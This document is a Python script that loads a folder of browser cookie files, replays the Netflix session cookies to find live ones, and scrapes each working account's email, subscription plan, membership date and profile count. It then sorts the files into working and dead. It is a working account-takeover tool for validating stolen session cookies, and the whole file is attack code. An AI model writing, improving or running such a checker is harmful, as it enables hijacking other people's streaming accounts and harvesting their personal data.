import glob
import tkinter as tk
from tkinter import filedialog
import json,requests,os
from http.cookiejar import CookieJar
import pandas as pd
import shutil
from alive_progress import alive_bar
import time
import requests
from bs4 import BeautifulSoup
import re
import calendar


working_cookies = 0
tested_cookies= 0
Dead_cookies=0
file_string=""

def update_bar(bar):
    global Dead_cookies, working_cookies
    bar.text('')
    bar.text(f'(Working🟢: {working_cookies},Dead🔴: {Dead_cookies})')
    bar()

def load_cookies_from_file(file_path):
    with open(file_path, 'r') as f:
        cookies_json = json.load(f)
    return cookies_json
    
def json_cookies_to_cookiejar(json_cookies):
    cookie_jar = CookieJar()
    for cookie in json_cookies:
        cookie_jar.set_cookie(requests.cookies.create_cookie(**cookie))
    return cookie_jar

def browse_folder():
    root = tk.Tk()
    root.withdraw()
    folder_path = filedialog.askdirectory()
    if folder_path:
        netscape_tester(folder_path)

def test_netflix_cookies(cookie_jar):
    url = "https://www.netflix.com/browse"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029. Safari/537.3",
        "Accept-Language": "en-US,en;q=0.5"
         }
    response = requests.get(url, headers=headers, cookies=cookie_jar)
    return "whos.watching" in response.text

def scrap(html, start, end):
    start_pos = html.find(start)
    if start_pos == -1:
        return ""
    end_pos = html.find(end, start_pos + len(start))
    if end_pos == -1:
        return ""
    return html[start_pos + len(start):end_pos]
def scrape_account_details(cookies_json,path):
    global cookies_string
    global ultra_hd
    url = "https://www.netflix.com/YourAccount"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029. Safari/537.3",
        "Accept-Language": "en-US,en;q=0.5"
    }
    account_details = {}
    try:
        cookie = json_cookies_to_cookiejar(cookies_json)
        valid = test_netflix_cookies(cookie)
        if valid:
            response = requests.get(url, headers=headers, cookies=cookie)
            account_details = {}
            account_details['Email'] = scrap(response.text, '<div data-uia="account-email" class="account-section-item account-section-email">', '</div>').strip()
            account_details['Subscription plan'] = scrap(response.text, '<div class="account-section-item" data-uia="plan-label"><b>', '</b>').strip()
            account_details['Membership'] = scrap(response.text, 'class="account-section-membersince--svg"></div>','</div>').strip()
            account_details['Email'] = scrap(response.text, '<div data-uia="account-email" class="account-section-item account-section-email">', '</div>').strip()
            soup = BeautifulSoup(response.content, "html.parser")
            profile_elements = soup.find_all("li", class_="profile")
            num_profiles = len(profile_elements)
            account_details['Users'] = num_profiles
            account_details['Connected Devices'] = "..."
            # Extracting the month and year from the 'Member' value
            member_since = account_details['Membership']
            month_year = re.findall(r'[A-Za-z]+\s+\d{4}', member_since)[0]
            
            # Converting the month to English
            month_dict = {v.lower(): k for k, v in enumerate(calendar.month_name)}
            for month, month_num in month_dict.items():
                month_year = month_year.replace(month, calendar.month_name[month_num])
            
            # Formatting the 'Member' value as desired
            formatted_member = '-'.join(month_year.split()[::-1])
            
            # Updating the 'Member' value in the dictionary
            account_details['Membership'] = formatted_member
            return account_details
    except requests.exceptions.RequestException as e:
        error_msg = f"Error connecting to {url}: {e}"
        print(error_msg)
        return
    except json.decoder.JSONDecodeError as e:
        error_msg = f"Error loading cookies from file: {e}"
        print(error_msg)
        return
def netscape_tester(folder_path):
 global file_string
    # Get a list of all text files in the folder
 file_paths = glob.glob(folder_path + "/*.txt")
 global Dead_cookies
 global working_cookies
 global tested_cookies
    # Iterate over the files
    
 with alive_bar(len(file_paths), ctrl_c=False, title=f'🟢CHECKING🟢:') as bar:
    for file_path in file_paths:
        tested_cookies+=1
        with open(file_path, "r") as file:
            text = file.read()
            file_string = os.path.basename(file_path)
            if "[working]" not in os.path.basename(file_path):
             file_string=os.path.splitext(file_string)[0] + "[working]" + os.path.splitext(file_string)[1]
        # Split the data into individual cookies
        lines = text.strip().split('\n')
        # Create an empty list to store the JSON data
        cookies = []
        # Loop through each cookie and add it to the JSON list
        for line in lines:
            if line.startswith('.netflix.com') or line.startswith('.www.netflix.com') or line.startswith('.whats-on-netflix.com:'):
                parts = line.strip().split('\t')
                cookie = {
                        'domain': parts[0],
                        'path': parts[2],
                        'name': parts[5],
                        'value': parts[6] if len(parts) >= 7 else parts[-1]
                    }
                cookies.append(cookie)
        cookies_json = json.dumps(cookies)
        working_folder_path = os.path.join(folder_path, "working")
        os.makedirs(working_folder_path, exist_ok=True)
        if test_cookies_string(cookies_json, os.path.splitext(os.path.basename(file_path))[0],folder_path):
            working_cookies+=1  
            # Rename the file with [working] suffix
            file_name = os.path.basename(file_path)
            while "[working]" in file_name or "[dead]" in file_name:
                file_name = file_name.replace("[working]", "").strip()
                file_name = file_name.replace("[dead]", "").strip()
            new_file_name = os.path.splitext(file_name)[0] + "[working]" + os.path.splitext(file_name)[1]
            new_file_path = os.path.join(working_folder_path, new_file_name)
            file.close()  # Close the file before renaming
            shutil.move(file_path, new_file_path)
        else:
            Dead_cookies+=1
            # Rename the file with [dead] suffix
            file_name = os.path.basename(file_path)
            while "[working]" in file_name or "[dead]" in file_name:
                file_name = file_name.replace("[working]", "").strip()
                file_name = file_name.replace("[dead]", "").strip()
            new_file_name = os.path.splitext(file_name)[0] + "[dead]" + os.path.splitext(file_name)[1]
            new_file_path = os.path.join(folder_path, new_file_name)
            file.close()  # Close the file before renaming
            shutil.move(file_path, new_file_path)
         # Update the progress bar
        time.sleep(0.02)
        update_bar(bar)

def test_cookies_string(string,file_name,working_folder_path):
    json_cookies = string
    try:
        cookies_json = json.loads(json_cookies)
        cookie_jar = json_cookies_to_cookiejar(cookies_json)

        if test_netflix_cookies(cookie_jar):

            #print("Cookies working:"+str(file_name))
            
            print(scrape_account_details(cookies_json,working_folder_path))
            #print("\n--------------------------------------\n")
            return True
        else:
            # Reset the background color of the text_edit widget
            #print("Cookies not working")
            return False
    except json.decoder.JSONDecodeError as e:
        print("Format error")
        return False
    except requests.exceptions.RequestException as e:
        error_msg = f"Error connecting ..."
        print(error_msg)
        return False

browse_folder()
print("\n")
print(f"tested cookies: {tested_cookies}"+"\n")
print(f"working cookies: {working_cookies}"+"\n")